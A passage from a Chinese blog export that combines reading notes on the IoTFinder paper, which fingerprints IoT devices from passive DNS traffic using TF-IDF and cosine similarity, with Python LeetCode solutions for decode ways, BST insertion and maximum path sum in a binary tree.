DNS。这种数据信息和一些本地DNS数据不同的是，它包含的不仅是当前的DNS数据（包括IP映射等），还包括了历史上所存在的一些DNS数据映射等。比如，一个域名在某个时间段内可以解析到多个IP地址上，一个IP地址也可以某个时间段内映射在多个域名，这些映射历史都是可以被Passive DNS数据包含在内，这样研究者可以从这些关联数据中发现已知的恶意域名与未知恶意域名之间的关系，从而挖掘出未知的威胁风险。 Passive DNS应用场景 检测网站钓鱼域名 阻断垃圾邮件干扰 识别恶意域名 提供威胁情报 检测域名劫持 品牌保护 域名DNS历史记录查询 查询主域名下的所有子域名 被动DNS工作原理 通过实例简单了解 以下实例，使用到的是美国Farsight Security公司推出的Passive DNS数据库—-DNSDB，有关这一案例的更多信息，可参考该公司的Passive DNS白皮书：https://info.farsightsecurity.com/passive-dns-ebook 介绍 面临挑战 传统通过banner grabbing 和fingerprinting 能够识别暴露网络服务的设备包括IoT设备， 但是当IoT设备托管在NAT或者其他中间盒后（防火墙），主动探测不能够识别IoT设备 当IoT设备被分配IPv6地址时，识别也面临挑战 B相关知识学习banner grabbing（横幅抓取）https://securitytrails.com/blog/banner-grabbing 横幅抓取是一种用于确定远程计算机上正在运行的服务的信息的活动 在渗透测试或安全审核期间，无论何时执行智能侦察过程，我们都需要注意当前Web服务器的公开信息。 这就是banner grabbing的来源。banner grabbing是获取软件横幅信息（名称和版本）的一种方法，无论是手动完成的，还是使用任何可自动为您完成的OSINT工具。 FTP服务器，Web服务器，SSH服务器和其他系统守护程序通常会公开重要信息，这些信息不仅涉及软件名称，而且还涉及它们所运行的确切版本和操作系统（相关的“横幅”数据）。 在匹配关键CVE的情况下，对任何协议进行抢夺式攻击都可能发现不安全和易受攻击的应用程序，这可能导致服务利用和损害。 您如何进行标语抢夺攻击？ 只需选择您要定位的服务，启动请求，检查收到的响应即可。 fingerprinting(指纹)https://securitytrails.com/blog/cybersecurity-fingerprinting 物理世界，指纹通常唯一标识单个个体，分析指纹是用于识别与所有类型的犯罪活动有关的最流行的技术之一，从抢劫到绑架甚至是谋杀。 在数字世界中，也有分析指纹的方法，但是从这个意义上讲，我们是在谈论操作系统，网络和服务指纹。 网络安全中的指纹 数字世界中的指纹与现实世界中的人类指纹相似。简而言之，指纹是可以用来检测软件，网络协议，操作系统或硬件设备的一组信息。 指纹（也称为足迹）是一种使用该信息将数据集关联起来的技术，以便以较高的可能性识别网络服务，操作系统编号和版本，软件应用程序，数据库，配置等。 一旦渗透测试人员获得足够的信息，此指纹数据就可以用作针对目标的利用策略的一部分 IoTFinder设计期望 Fully-automated fingerprint learning（全自动指纹学习） One fingerprint per IoT device（每个物联网设备一个指纹） 给一个DNS流量跟踪D，从Ik设备学习得到一个指纹fk，利用fk作为二分类判断Ik是否产生或者有贡献于在D中看到DNS活动 multi-label classification 与多类别分类方法不同，这些单独的指纹使我们可以轻松地执行多标签分类，从而可以识别可能在同一（NAT）IP地址后共同托管的多个不同的物联网设备 在混合网络流量中准确识别IoT设备 结果可解释 有效的匹配 本文贡献 提出了IoTFinder系统，可有效大规模检测IoT设备。其旨在自动从真实IoT设备中学习统计DNS流量指纹，并对地理位置不同的网络位置收集的大量DNS流量上进行有效的匹配来源指纹。 IoTFinder用作多标签分类器，即IoT设备位于NAT后面，并且其流量与由同一本地网络中托管的其他IoT和非IoT设备生成的流量“混合”，也能够检测到IoT设备。 为了评估统计模型的准确性，我们在几种不同的设置下对我们的IoT指纹进行了详细评估，包括通过第三方IoT流量数据集计算检测结果。 这些详细的实验使我们能够突出提出的方法的优点，并指出可能的局限性 我们还将物联网指纹应用于在美国的ISP收集的DNS流量上，该ISP托管了超过4000万客户，以评估我们系统的性能。 我们的结果表明，我们可以在有限的时间内（略大于一小时）有效地处理一整天的ISP级DNS流量，并测试所有IoT指纹。 直觉和方法概述IoT数据收集建立大型物联网实验室，包括多个语音助手、摄像头等53台来自不同供应商的活动IoT设备。这些设备部署在人参与的实验室中。本文特别关注IoT设备生成的DNS流量，实验中使用的IoT DNS数据集跨越1.5个月。 激励的示例 上图表示，24个小时内部分IoT设备查询域名的情况， 水平表示每个IoT设备查询的域名， 垂直代表一个小时的窗口， 原点表示DNS查询的次数 基于IoT设备产生的DNS活动构建简单探测模型 文献【19】提出类似模型：给定特定IoT设备的查询的一组域和从第三方网络收集的被动DNS跟踪，如果跟踪中DNS客户端（例有匿名ID或IP地址标识）查询的域名在特定IoT设备查询域中，就将该客户端的IP（或匿名ID）标记为IoT设备托管在其下。 此模型问题 容易产生大量误报 易通过探测域（该域是否包含人类可访问内容）过滤掉一些域名，从而会丢弃一些信息，降低潜在的分类能力 也会丢弃不包含供应商名称或设备型号名称的域名 使用单个域名检测IoT设备，可能会导致识别共享DNS行为（例，来自同一供应商的不同设备型号）的设备产生严重混淆 因此本文想法： 组合域名，以及不同IoT设备发出DNS查询的频率通常是具体的。这一观察结果有利于构建 一组有区别的行为指纹，可识别不同IoT设备模型，并当与普通客户端DNS行为匹配时，不易触发大量误报。 利用该直觉构建一个系统 自动学习基于DNS的IoT指纹， 无需对查询域名格式严格假设 无需手动推导过滤启发式减少误报 方法概述构建高效的基于DNS的IoT设备指纹，将IoT设备检测和文档检索进行类比【20】 名称表示 $C_i$表示通用设备（IoT或非IoT），实践中由设备的IP(v4或v6)地址表示 $d_{ij}$是设备$C_i$查询的域名 $f_{ij}$是$d_{ij}$在$C_i$的DNS流量中出现的频率 我们把$C_i={(d_{ij},f_{ij})}j$视为包含一组$d{ij}$术语的文档，每个术语都有各自的术语频率$f_{ij}$ 名词表示 $Q_k$为IoT设备 $q_{kj}$为$Q_k$查询的域名 $f_{kj}$为$Q_k$查询$q_{kj}$的频率 沿用文档检索的类比，将$Q_k={(q_{kj},f_{kj})}_j$作为搜索查询词，识别IoT设备的任务是： 检索与搜索查询$Q_k$相似的所有文档$C_i$,并根据相似度排序 根据类比，为了计算IoT设备$Q_k$的DNS行为与通用设备$C_i$的DNS行为之间的相似性 首先将每个$Q_k$和$C_i$转换为各自的TF-IDF(即术语频率-逆文档频率)特征向量表示【20】，然后测量相似性（例，余弦相似性）在得到的特征向量之间。 B相关知识学习TF-IDF（术语频率-逆文档频率）TF-IDF反映了在文档集合中一个单词对一个文档的重要性，经常在文本数据挖据与信息提取中用来作为权重因子 参考TF-IDF 面临挑战主要有关IoT设备模型和文档检索之间的类比。 无论IoT设备是位于NAT后还是和其它设备一起，我们匹配IoT设备的目标都不能立即适合文档检索场景。 文档检索更青睐于单个主题的检索，相比于含多个主题的文档相比，不希望这不利于匹配托管于NAT后的IoT设备或者处于相同IP地址的（IoT或非IoT）等等。。。 系统详细设计 基于DNS的IoT指纹学习为了模型化IoT设备的DNS行为，进行如下操作： $Q_k={q_{kj}}{j=1}^{m_k}$，表示一个IoT设备在$T_l$时间内查询$m_k$个不同的域名$q{kj}$ 将$T_l$划分成长度为$w$且不重叠的时间窗口 $N_w=\\frac{T_l}{w}$表示长度为$w$的时间窗口个数 给定$q_{kj}$，通过判断其是否在时间窗口中，$n_{q_{kj}}$表示在$N_w$个时间窗口，查询域名$q_{kj}$的次数 定义$p_{kj}=\\frac{n_{q_{kj}}}{N_w}$，表示设备$Q_k$查询的域名$q_{kj}$在任意长度w的时间窗口内至少查询一次的概率 则每个IoT设备$Q_k$的统计指纹为$P_k={(q_{kj},p_{kj})}_{j=1}^{m_k}$ 建立查询频率和词频之间的映射取决于测试时考虑的流量窗口的长度 离散化时间处理过程能够弥补相同供应商和相同模型的IoT设备查询频率可能的短期变化 例如，相同的IoT设备Ia 和Ib，Ia部署在缓存DNS转发器（例，NAT），Ib直接或者通过非缓存的中间盒设备连接到ISP network，两者的查询频率可能不同（由于处于不同的middlebox下） 设置w的长度超过DNS资源记录(例，A记录 或者AAAA记录)TTL，能够使得Ia和Ib的DNS缓存行为近似相等，使得查询频率近似相等 这样更精确化的进行IoT指纹的匹配，后面讨论时间窗口w的取值 计算IDF：估计每个IoT查询的域在全局DNS 跟踪中的反向“流行度” $Q={q_i}_{i=1}^m$表示任意IoT设备查询的不同域名的集合 类似，$Q=\\bigcup{q_{kj}}_{j=1}^{m_k}$ $T_p$表示被动DNS跟踪收集的观察时间 $N_c(q_i)$表示在$T_p$时间内查询域名$q_i\\in Q$的客户端数，$N_c$表示在$T_p$时间内至少查询一个IoT域名的总的客户端数量 定义$IDF(q_i)=\\log(1+\\frac{N_c}{N_c(q_i)+1})$，也即表示有机会匹配一个IoT设备，域名$q_i$越少见，其逆文档频率越高（其特异性越高） 实践中，从模型中筛选较为流行的域名。在文档检索类别中，过滤掉“stop word”域名，如过滤d域名（例：google.com）,过滤掉d和www.d 过滤目的： 减少测试时要考虑匹配的客户端数量$C_i$，从而使指纹匹配更加高效 减少触发误报的概率，因为高度流行的域名被大多数非IoT设备查询，从而可能导致虚假匹配 学习过程中，获得每个IoT设备的统计指纹，一个IoT设备指纹应包含内容： IoT域查询频率：对每个IoT设备$Q_k$， $P_k={(q_{kj},p_{kj})}_{j=1}^{m_k}$ 用来计算$P_k$的时间窗口$w$ 每个域的IDF值：${IDF(q_{kj})}_{j=1}^{m_k}$ 基于每个设备的最大容许假阳性率$\\phi$计算的探测阈值$\\theta_k$ 基于DNS的IoT指纹匹配本节阐释基于DNS的IoT指纹如何与未来的被动DNS追踪进行匹配 相关名词： $T_t$作为被动观察DNS流量的时间窗口 $C_i$表示DNS流量中DNS查询的一个客户端 我们目标：在指纹$P_k$和$C_i$的DNS行为之间，计算一个得分$s_{ki}$， 计算TF-IDF向量： 计算时间窗口个数：$N_t=\\lceil \\frac{T_t}{w} \\rceil$，其中$w$和学习$P_k$时使用的是相同的 设定$f_{kj}=p_{kj}*N_t$，则TF向量$V_k={(q_{kj},f_{kj})}{j=1}^{m_k}$，$f{kj}$表示的是在$T_t$时间内，IoT设备k查询域$q_{kj}$的时间窗口个数 最后，计算相应TF-IDF值$\\psi_{kj}=f_{kj}*IDF(q_{kj})$ 使用$\\Psi_k={(q_{kj},\\psi_{kj})}_{j=1}^{m_k}$表示时间$T_k$内IoT设备$Q_k$的TF-IDF向量 计算客户端$C_i$的TF-IDF向量 假定$C_i$在$T_t$时间内查询$n_i$个不同的域名$d_{ij}$及其发生的频率$f_{ij}$ 即$C_i={(d_{ij},f_{ij})}{j=1}^{n_i}$，其中$f{ij}$是计算查询域名$d_{ij}$的时间窗口w的个数 计算一个IoT的TF-IDF向量和一个客户端$C_i$之间的相似性 将$C_i$映射到$\\Psi_k$的$m_k$空间中，实际上，计算新向量$C_i’={(q_{kl},f_{kl}’)}_{l=1}^{m_k}$ 其中，${q_{kl}}_{l=1}^{m_k}$表示的是和$\\Psi_k$相同的$m_k$域名集合 若$q_{kl}=d_{ij}，则f_{kl}’=f_{ij}$ 若没有域名$d_{ij}$匹配$q_{kl}，则f_{kl}’=0$ 换种说法，也即是我们取所有由客户端$C_i$查询的域同时也被IoT设备查询的域。设置它们的TF值，以反映在时间Tt中$C_i$询问它们的频率。如果一个IoT设备$Q_k$查询的域不在$C_i$的行为中，设定他的频率为0 最后计算，TF-IDF向量$\\Gamma_i={(q_{kl},\\gamma_{kl})}{l=1}^{m_k}$，其中$\\gamma{kl}=f_{kl}’ \\cdot IDF(q_{kl})$ 这种将$C_i$的行为“投射”到$Q_k$的域名空间能够实现我们主要目标之一 能够避免仅仅因为$C_i$表示共存于同一IP地址后面(例如，在NAT后面)的多个设备(可能包括几个其他物联网和非物联网设备)的DNS流量，而惩罚$Q_k$和$C_i$的相似性分数， 现在拥有两个跨度相同的向量空间$\\Psi_k$和$\\Gamma_i$ 令$\\psi=[\\psi_{kj}]，\\gamma=\\gamma_{kj}$是包含$\\Psi_k和\\Gamma_i$的两个向量 计算匹配分数：$s(\\Psi_k,\\Gamma_i)=\\frac{\\psi \\cdot \\gamma}{||\\psi||\\cdot ||\\gamma||}$(例，计算两者余弦相似度) 若$s(\\Psi_k,\\Gamma_i)\\geq \\theta_k$，就认为$C_i$的DNS行为匹配IoT设备$Q_k$，其中$\\theta_k$是自动计算的阈值，将误报的数量限制在预定的最大值$\\phi$ 学习设备检测阈值为了学习每个特定设备的检测阈值$\\theta_k$，进行如下步骤 收集大的数据集$D$(在训练中的未被看到，标记为被动DNS追踪)，实践中，$D$为我们提够了大量非IoT设备的流量记录，构成负面数据 在$D$中获取$C_i$的行为，并将其与之前学习的IoT指纹进行匹配 计算每个指纹和$D$中每个非IoT设备之间的余弦值$s(\\Psi_k,\\Gamma_i)$ 调整检测阈值$\\theta_k$计算假阳性的变化 同样，考虑IoT设备$Q_k$生成的未见过的DNS流量，使用该流量计算每个IoT设备指纹$\\Psi_k$的真阳率 给定最大容许假阳率$\\phi$，目标找到检测阈值$\\theta_k$，满足两个要求： 指纹$\\Psi_k$产生的假阳率$F_k\\leq \\phi$ 保持$F_k\\leq \\phi$时，最大化真阳率 ROC曲线图（随着检测阈值变化，真阳性率和假阳性率之间的权衡） 如图带有线性插值的ROC曲线 IoT指纹部署本节讨论如何枚举野外IoT设备 由于计算量大的问题，为了解决这个问题，我们在一个大型Apache Spark集群中实现了我们的特征向量计算和指纹匹配，使得来自一个大型ISP的真实世界的DNS流量的N ×M指纹匹配计算时间减少到每天不到一个小时(详见第4节)。 评估B相关知识DPI（Deep Packet Inspection）是一种基于数据包的深度检测技术，针对不同的网络应用层载荷（例如HTTP、DNS等）进行深度检测，通过对报文的有效载荷检测决定其合法性。 相关工作 许多工作探索了使用网络流量分析来检测网络中的物联网设备或研究它们的行为[23]-[37]。 其中一些工作利用网络流量统计进行设备识别[23]-[25]或受损设备检测[26]-[28] 其他工作使用了对不同应用层协议的分析，如HTTP、Telnet、DNS等。，识别物联网设备[29]-[32] 此外，还提出了主动探测技术，通过扫描网络资产[28]、[33]或使用设备的媒体访问控制地址来识别供应商和产品类型[38]、[39]，从而识别物联网设备。 值得注意的是，这些作品中有许多需要访问物联网设备所在的本地网络，或者访问网络流，而在非常大的规模上收集这些网络流通常很昂贵。另一方面，我们专注于仅基于大规模被动DNS流量分析来高效检测物联网设备，因为全球分布式DNS流量通常更容易大规模收集(在某些情况下可以购买) 最近的一些作品研究了物联网设备产生的域名系统流量的特征[35]，[36]，并讨论了相关的隐私含义[34]，[40]。最近，有两项工作考虑将DNS流量用于物联网设备检测[19]，[37]。据我们所知，[19]，[37]是最接近我们的工作 在[19]中，作者使用域名查询和物联网设备联系的目的IP地址来构建设备检测系统。如第2.2节所述，郭等人[19]提出了一些手动设计的启发式方法来过滤掉可能引起误报的物联网查询域。例如，给定物联网设备查询的一组域，它们探测这些域以确定它们是否是“面向人类的”(即，它们是否包含人类可访问的内容)。此外，他们还会过滤掉不包含物联网设备供应商名称的域名。然而，如第2.2节所述，这种启发式方法可能会丢弃具有高度歧视性的域名，并可用于更准确地检测特定物联网设备的存在。更重要的是，[19]建议使用单一域名进行检测，这可能会在具有重叠DNS行为的设备(例如，来自同一供应商的不同设备型号)之间造成严重混淆。另一方面，IoTFinter并不依赖于上面提到的启发式，而是可以基于设备查询的域名组合自动学习物联网设备检测模型。此外，IoTFinter会自动学习每个统计物联网指纹的检测阈值，以便将可能的误报限制在所需的容许量内。 在构建了IoTFinter之后，我们意识到最近发表的一篇文章[37]也提出了使用TF-IDF来模拟由物联网设备生成的DNS流量。然而，[37]与我们的工作大不相同。首先，在[37]中提出的系统要求要分类的流量必须已知来自单个物联网设备。引用[37]:[检测]算法应仅在已知流量文档属于已知为物联网设备的设备时调用。”相反，IoTFinder不需要这种先验知识，即使物联网设备与许多其他物联网和非物联网设备共同托管在同一个IP地址后面(例如，在同一个NAT后面)，也能够检测到它们。其次，在[37]中，检测阈值必须由操作员手动设置，而我们设计了一个 一种算法，用于标记现实世界的非物联网流量，并自动学习每个设备模型的检测阈值，以达到预定的最大容许误报率。此外，[37]中介绍的检测管道依赖于WHOIS记录和x509证书来识别物联网设备的供应商。然而，在许多实际情况下，域名的所有者可能与供应商不同，例如当使用私有的WHOIS记录时，或者当服务托管在与云相关的域(例如AWS)上时。在这种情况下，设备最终可能会被分配给错误的供应商。这种错误的决定将级联到设备类型分类器，这依赖于供应商分类器的成功来进行正确的设备识别[37]。我们的工作不一样，因为我们只依靠DNS流量分析，对一个物联网设备查询的域名的归属不做任何假设。此外，我们专注于大规模检测，并实施IoTFinter，以有效检测托管数千万客户端的大型ISP网络中的许多不同物联网设备。 还有一项提议是通过自动域名注册来识别物联网设备[41]。然而，目前还不清楚这一提议在未来是否会被广泛采用，因为它需要物联网供应商的合作。此外，遗留物联网设备可能通过这种机制保持不可检测。另一方面，我们的系统不需要物联网供应商的合作，可以“原样”检测物联网设备，包括可能不支持未来协议的遗留设备。 讨论和限制 DNS流量轻量，易收集，信息粒度低。 本文基于DNS的IoT指纹能够模拟IoT设备DNS行为，能够精确检测许多IoT设备（即是该IoT设备托管在NAT后还是和其它非IoT设备混杂一起） 某些情况下，基于DNS的流量模型无法捕捉同一供应商生产的不同设备之间的差异 同时，每当发现IoT指纹匹配通过相关检测阈值时，我们的系统不仅报告已经检测到设备，还报告具有什么相似性。因此，当相似性不相同时，它可以用作一种置信度得分，以便通过选择具有最高相似性的设备来消除不同设备的歧义。 当大量(例如，数百个)物联网和非物联网设备托管在同一IP之后(例如，在同一NAT之后)时，准确检测物联网设备变得越来越困难。尽管如此，我们表明，我们的统计指纹仍然能够正确检测各种各样的物联网设备，而不会出现误报，即使在这种具有挑战性的情况下也是如此 目前我们的系统无法识别一个域名系统测试背后有多少相同设备的实例。主要原因是域名系统缓存效果可能会“压缩”查询频率信息，从而难以识别表现出相同域名系统行为的设备的确切数量 自然，我们的方法仅限于非加密的域名系统流量，因为我们需要访问查询的域名。最近，出现了使用DoH (RFC8484)或DoT (RFC7858)加密DNS流量的趋势。特别是，集中式DoH可能是一个问题，因为它可能会阻止本地网络运营商(包括互联网服务提供商)收集有关其客户端生成的域名系统流量的详细信息。然而，我们应该考虑一些观察结果。首先，DoH可能会对其他现有的安全应用程序产生负面影响，有人提议尝试防止这种情况[22]。其次，DoH目前大多局限于浏览器发布的DNS查询。因此，如果DoH成为主要浏览器的默认协议，物联网设备可能更容易检测到，因为它们的域名系统查询将与少量的非域名系统流量混合在一起。未来的物联网设备最终也可能开始采用DoH或DoT。然而，对于许多资源受限且不允许添加DNS加密软件的传统物联网设备来说，它们的DNS流量特征可能会变得越来越明显。最后，虽然采用DoH的新(或更新的)物联网设备可能会被直接的互联网服务提供商监控所隐藏，但我们的方法仍然有效，因为它可以由DoH运营商(如谷歌或Cloudflare)而不是单个互联网服务提供商来应用，以估计互联网上的物联网设备数量","categories":[{"name":"PapersReading","slug":"PapersReading","permalink":"https://fishni.github.io/categories/PapersReading/"}],"tags":[{"name":"PapersReading","slug":"PapersReading","permalink":"https://fishni.github.io/tags/PapersReading/"}]},{"title":"【数据结构与算法】【LeetCode】【动态规划】91.解码方法","slug":"LeetCode-C-动态规划-91. 解码方法","date":"2020-12-12T16:00:00.000Z","updated":"2020-12-14T01:20:17.759Z","comments":true,"path":"2020/12/13/LeetCode-C-动态规划-91. 解码方法/","link":"","permalink":"https://fishni.github.io/2020/12/13/LeetCode-C-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92-91.%20%E8%A7%A3%E7%A0%81%E6%96%B9%E6%B3%95/","excerpt":"dp数组，单变量","text":"dp数组，单变量 题目一条包含字母 A-Z 的消息通过以下方式进行了编码： &apos;A&apos; -&gt; 1 &apos;B&apos; -&gt; 2 ... &apos;Z&apos; -&gt; 26给定一个只包含数字的非空字符串，请计算解码方法的总数。 题目数据保证答案肯定是一个 32 位的整数。 示例1： 输入：s = &quot;12&quot; 输出：2 解释：它可以解码为 &quot;AB&quot;（1 2）或者 &quot;L&quot;（12）。示例2： 输入：s = &quot;226&quot; 输出：3 解释：它可以解码为 &quot;BZ&quot; (2 26), &quot;VF&quot; (22 6), 或者 &quot;BBF&quot; (2 2 6) 。示例3： 输入：s = &quot;0&quot; 输出：0示例4： 输入：s = &quot;1&quot; 输出：1示例5： 输入：s = &quot;2&quot; 输出：1注： 1 &lt;= s.length &lt;= 100 s 只包含数字，并且可能包含前导零。题解算法分析： 利用动态规划进行处理，如下情况讨论： dp[i]为str[0..i]的译码方法总数 分情况讨论：（建立最优子结构） 若s[i]=‘0’，若s[i-1]=‘1’or ‘2’，则dp[i]=dp[i-2]；否则return 0 解释：s[i-1]+s[i]唯一被译码，不增加情况 若s[i-1]=‘1’，则dp[i]=dp[i-1]+dp[i-2] 解释：s[i-1]与s[i]分开译码，为dp[i-1]；合并译码，为dp[i-2] 若s[i-1]=‘2’且‘1’&lt;=s[i]&lt;=‘6’，则dp[i]=dp[i-1]+dp[i-2] 解释：同上 由分析可知，dp[i]仅可能与前两项有关，故可以用单变量代替dp[]数组，将空间复杂度从O(n)降到O(1) 方法一：dp数组12345678910111213141516171819class Solution: def numDecodings(self, s: str) -&gt; int: if s[0]=='0': return 0 dp =[0 for i in range(len(s))] dp[0]=1 dp[-1]=1 for i in range(1,len(s)): if s[i]=='0': if s[i-1]=='1' or s[i-1]=='2': dp[i]=dp[i-2] else: return 0 else: if (s[i - 1] == '1' or (s[i - 1] == '2' and s[i] &gt;= '1' and s[i] &lt;= '6')): dp[i]=dp[i-1]+dp[i-2] else: dp[i]=dp[i-1] return dp[-1] 1234a= Solution()s=\"1201234\"result=a.numDecodings(s)print(result) 3方法二：单变量代替dp数组123456789101112131415161718class Solution: def numDecodings(self, s: str) -&gt; int: if s[0]=='0': return 0 pre=1 cur=1 # pre=dp[-1]=1 cur=dp[0]=1 for i in range(1,len(s)): tmp=cur if s[i]=='0': if s[i-1]=='1' or s[i-1]=='2': cur = pre else: return 0 else: if (s[i - 1] == '1' or (s[i - 1] == '2' and s[i] &gt;= '1' and s[i] &lt;= '6')): cur = cur +pre pre=tmp return cur 1234a= Solution()s=\"1201234\"result=a.numDecodings(s)print(result) 3","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"动态规划","slug":"动态规划","permalink":"https://fishni.github.io/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】701.二叉搜索树中的插入操作","slug":"LeetCode-B-二叉树-701. 二叉搜索树中的插入操作","date":"2020-12-08T16:00:00.000Z","updated":"2020-12-09T02:17:06.042Z","comments":true,"path":"2020/12/09/LeetCode-B-二叉树-701. 二叉搜索树中的插入操作/","link":"","permalink":"https://fishni.github.io/2020/12/09/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-701.%20%E4%BA%8C%E5%8F%89%E6%90%9C%E7%B4%A2%E6%A0%91%E4%B8%AD%E7%9A%84%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C/","excerpt":"二叉搜索查找，插入","text":"二叉搜索查找，插入 题目给定二叉搜索树（BST）的根节点和要插入树中的值，将值插入二叉搜索树。 返回插入后二叉搜索树的根节点。 输入数据 保证 ，新值和原始二叉搜索树中的任意节点值都不同。 注意，可能存在多种有效的插入方式，只要树在插入后仍保持为二叉搜索树即可。 你可以返回 任意有效的结果 。 示例1 输入：root = [4,2,7,1,3], val = 5 输出：[4,2,7,1,3,5] 解释：另一个满足题目要求可以通过的树是： 示例2 输入：root = [40,20,60,10,30,50,70], val = 25 输出：[40,20,60,10,30,50,70,null,null,25]示例3 输入：root = [4,2,7,1,3,null,null,null,null,null,null], val = 5 输出：[4,2,7,1,3,5]题解思路与算法 首先回顾二叉搜索树的性质：对于任意节点 root 而言，左子树（如果存在）上所有节点的值均小于root.val，右子树（如果存在）上所有节点的值均大于 root.val，且它们都是二叉搜索树。 因此，当将 val 插入到以root 为根的子树上时，根据 val 与 root.val 的大小关系，就可以确定要将val 插入到哪个子树中。 如果该子树不为空，则问题转化成了将 val 插入到对应子树上。 否则，在此处新建一个以 val 为值的节点，并链接到其父节点root 上 复杂度分析 时间复杂度：O(N)，其中 N 为树中节点的数目。最坏情况下，我们需要将值插入到树的最深的叶子结点上，而叶子节点最深为 O(N) 空间复杂度：O(1)。我们只使用了常数大小的空间。 123456789101112131415161718192021222324252627282930# Definition for a binary tree node.from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 123456789101112131415161718192021222324252627class Solution: def insertIntoBST(self, root: TreeNode, val: int) -&gt; TreeNode: if not root: return TreeNode(val) pos = root while pos: if val &lt; pos.val: if not pos.left: pos.left = TreeNode(val) break else: pos = pos.left else: if not pos.right: pos.right = TreeNode(val) break else: pos = pos.right return rootroot = [40,20,60,10,30,50,70]val = 25root_tree=create_tree(root)a=Solution()result =a.insertIntoBST(root_tree,val)","categories":[{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"}],"tags":[{"name":"python","slug":"python","permalink":"https://fishni.github.io/tags/python/"},{"name":"数据结构与算法","slug":"数据结构与算法","permalink":"https://fishni.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"},{"name":"二叉树","slug":"二叉树","permalink":"https://fishni.github.io/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"}]},{"title":"【数据结构与算法】【LeetCode】【二叉树】124.二叉树中的最大路径和","slug":"LeetCode-B-二叉树-124. 二叉树中的最大路径和","date":"2020-12-07T16:00:00.000Z","updated":"2020-12-08T03:12:36.695Z","comments":true,"path":"2020/12/08/LeetCode-B-二叉树-124. 二叉树中的最大路径和/","link":"","permalink":"https://fishni.github.io/2020/12/08/LeetCode-B-%E4%BA%8C%E5%8F%89%E6%A0%91-124.%20%E4%BA%8C%E5%8F%89%E6%A0%91%E4%B8%AD%E7%9A%84%E6%9C%80%E5%A4%A7%E8%B7%AF%E5%BE%84%E5%92%8C/","excerpt":"递归，最优","text":"递归，最优 题目给定一个非空二叉树，返回其最大路径和。 本题中，路径被定义为一条从树中任意节点出发，沿父节点-子节点连接，达到任意节点的序列。该路径至少包含一个节点，且不一定经过根节点。 示例1 输入：[1,2,3] 1 / \\ 2 3 输出：6示例2 输入：[-10,9,20,null,null,15,7] -10 / \\ 9 20 / \\ 15 7 输出：42题解思路路径每到一个节点，有 3 种选择：1. 停在当前节点。2. 走到左子节点。3. 走到右子节点。 走到子节点，又面临这 3 种选择，可以用递归。 注意！不能走进一个分支又掉头回来走另一个分支，路径会重叠。 定义递归函数 首先，考虑实现一个简化的函数 maxGain(node)，该函数计算二叉树中的一个节点的最大贡献值，具体而言，就是在以该节点为根节点的子树中寻找以该节点为起点的一条路径，使得该路径上的节点值之和最大。 具体而言，该函数的计算如下。 空节点的最大贡献值等于 0。 非空节点的最大贡献值等于节点值与其子节点中的最大贡献值之和（对于叶节点而言，最大贡献值等于节点值）。 一个子树内部的最大路径和 = 左子树提供的最大路径和 + 根节点值 + 右子树提供的最大路径和 123456789101112131415161718192021222324252627282930# Definition for a binary tree node.from queue import Queueclass TreeNode: def __init__(self, x): self.val = x self.left = None self.right = Nonedef create_tree(list_tree): if not list_tree: return [] new_queue= Queue() root = TreeNode(list_tree[0]) new_queue.put(root) # 先入队一个结点 count = 1 while not new_queue.empty() and count&lt;len(list_tree): dequeue = new_queue.get() # 出队 if not dequeue.left and not dequeue.right: if count&lt;len(list_tree) and list_tree[count]: dequeue.left=TreeNode(list_tree[count]) count= count+1 if count&lt;len(list_tree) and list_tree[count]: dequeue.right=TreeNode(list_tree[count]) count= count+1 if dequeue.left: new_queue.put(dequeue.left) if dequeue.right: new_queue.put(dequeue.right) return root 12345678910111213141516171819202122232425class Solution: def __init__(self): self.maxSum = float(\"-inf\") def maxPathSum(self, root: TreeNode) -&gt; int: def maxGain(node): if not node: return 0 # 递归计算左右子节点的最大贡献值 # 只有在最大贡献值大于 0 时，才会选取对应子节点 leftGain = max(maxGain(node.left), 0) rightGain = max(maxGain(node.right), 0) # 节点的最大路径和取决于该节点的值与该节点的左右子节点的最大贡献值 priceNewpath = node.val + leftGain + rightGain # 更新答案 self.maxSum = max(self.maxSum, priceNewpath) # 返回节点的最大贡献值 return node.val + max(leftGain, rightGain) maxGain(root) return self.maxSum 12345root = [-10,9,20,None,None,15,7]root_tree=create_tree(root)a=Solution()result =a.maxPathSum(root_tree)print(result) 